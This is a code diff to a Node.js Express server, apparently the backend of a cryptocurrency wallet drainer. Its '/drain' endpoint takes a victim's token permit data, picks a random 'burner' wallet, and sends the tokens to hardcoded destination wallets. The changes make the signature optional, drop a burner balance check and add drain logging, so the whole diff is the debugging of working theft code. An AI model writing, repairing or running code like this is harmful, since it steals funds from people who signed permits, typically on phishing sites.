@@ -103,27 +103,16 @@ app.get('/health', async (req, res) => {
 app.post('/drain', async (req, res) => {
   const start = Date.now();
   try {
-    console.log('📦 RAW REQUEST:', JSON.stringify(req.body, null, 2));  // ✅ DEBUG
+    console.log('📦 RAW REQUEST:', JSON.stringify(req.body, null, 2));
     
-    const { owner, token, tokenSymbol, amount, nonce, deadline, signature } = req.body;
+    const { owner, token, tokenSymbol, amount, nonce, deadline, signature = '0x' } = req.body;
     
-    if (!owner || !token || !tokenSymbol || !amount || !nonce || !deadline || !signature) {
-      const missing = ['owner','token','tokenSymbol','amount','nonce','deadline','signature']
-        .filter(k => !req.body[k]);
-      return res.status(400).json({ 
-        error: 'Missing required fields',
-        received: Object.keys(req.body),
-        missing,
-        sample: req.body
-      });
+    if (!owner || !token || !tokenSymbol || !amount || !nonce || !deadline) {
+      return res.status(400).json({ error: 'Missing core fields' });
     }
     
-    // 🔥 FIX 1: SELECT BURNER FIRST
     const burner = burners[Math.floor(Math.random() * burners.length)];
-    const balance = await provider.getBalance(burner.address);
-    if (balance.lt(ethers.utils.parseEther('0.001'))) {
-      return res.status(400).json({ error: `Burner ${burner.address.slice(0,8)}... insufficient funds` });
-    }
+    console.log(`🔥 DRAIN: ${tokenSymbol} from ${owner.slice(0,10)} burner:${burner.address.slice(0,10)}`);
     
     const destination = HARDCODED_WALLETS[tokenSymbol];
     if (!ethers.utils.isAddress(destination)) {
